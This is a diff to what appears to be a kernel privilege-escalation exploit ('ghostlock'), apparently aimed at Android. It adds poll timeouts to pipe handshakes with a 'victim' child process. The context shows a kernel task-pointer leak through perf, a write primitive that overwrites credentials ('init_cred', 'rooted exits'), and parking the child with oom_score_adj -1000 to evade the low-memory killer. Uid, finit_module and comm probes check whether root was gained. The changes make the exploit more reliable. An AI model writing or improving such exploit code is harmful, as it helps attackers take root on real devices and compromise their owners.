@@ -10,8 +10,22 @@
 #include "support/native_resource.hpp"
 
 #include <array>
+#include <poll.h>
 
 namespace ghostlock::session::victim {
+    /* Bounds every pipe handshake: a child parked in the kernel (e.g. a W2
+     * write that landed on a wrong address) used to block these reads forever
+     * and the run stalled silently after the last "[route] threads joined". */
+    static bool await_readable(int fd, int timeout_ms) {
+        struct pollfd pfd {fd, POLLIN, 0};
+        const int rc = poll(&pfd, 1, timeout_ms);
+        return rc > 0 && (pfd.revents & (POLLIN | POLLHUP)) != 0;
+    }
+
+    static constexpr int kVictimTaskTimeoutMs = 60000;
+    static constexpr int kUidProbeTimeoutMs = 15000;
+    static constexpr int kForkProbeTimeoutMs = 30000;
+    static constexpr int kCommProbeTimeoutMs = 10000;
     /* rooted exits kfree the static init_cred (w2 stores it with no
  * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
     static void park_child_process_forever(void) {
@@ -193,6 +207,11 @@ namespace ghostlock::session::victim {
         pid_t child = spawn_child(p);
         if (child < 0) return std::nullopt;
         uintptr_t task = 0;
+        pr_info("victim: waiting for perf task leak (timeout %d ms)\n",
+                kVictimTaskTimeoutMs);
+        if (!await_readable(p.task_read.get(), kVictimTaskTimeoutMs)) {
+            pr_warning("victim task leak timed out; retiring child\n");
+        }
         ssize_t nr = read(p.task_read.get(), &task, sizeof(task));
         p.task_read.reset();
         const uintptr_t leaked = (nr == static_cast<ssize_t>(sizeof(task)))
@@ -212,6 +231,10 @@ namespace ghostlock::session::victim {
         auto *stage = static_cast<struct w2_stage_context *>(context);
         if (write(stage->pipes.cmd_write.get(), "C", 1) != 1) return 0;
 
+        if (!await_readable(stage->pipes.uid_read.get(), kUidProbeTimeoutMs)) {
+            pr_warning("child uid probe timed out; child likely parked in kernel\n");
+            return 0;
+        }
         uint32_t child_uid = 9999;
         if (read(stage->pipes.uid_read.get(), &child_uid, sizeof(child_uid)) !=
             static_cast<ssize_t>(sizeof(child_uid))) {
@@ -227,6 +250,10 @@ namespace ghostlock::session::victim {
         auto *stage = static_cast<struct w2_stage_context *>(context);
         if (write(stage->pipes.cmd_write.get(), "F", 1) != 1) return 0;
 
+        if (!await_readable(stage->pipes.uid_read.get(), kForkProbeTimeoutMs)) {
+            pr_warning("finit_module probe timed out\n");
+            return 0;
+        }
         uint32_t code = 0;
         if (read(stage->pipes.uid_read.get(), &code, sizeof(code)) !=
             static_cast<ssize_t>(sizeof(code))) {
@@ -248,6 +275,10 @@ namespace ghostlock::session::victim {
         auto *stage = static_cast<struct w3_stage_context *>(context);
         if (write(stage->pipes.cmd_write.get(), "M", 1) != 1) return 0;
 
+        if (!await_readable(stage->pipes.uid_read.get(), kCommProbeTimeoutMs)) {
+            pr_warning("comm probe timed out\n");
+            return 0;
+        }
         uint32_t report = 0;
         if (read(stage->pipes.uid_read.get(), &report, sizeof(report)) !=
             static_cast<ssize_t>(sizeof(report))) {
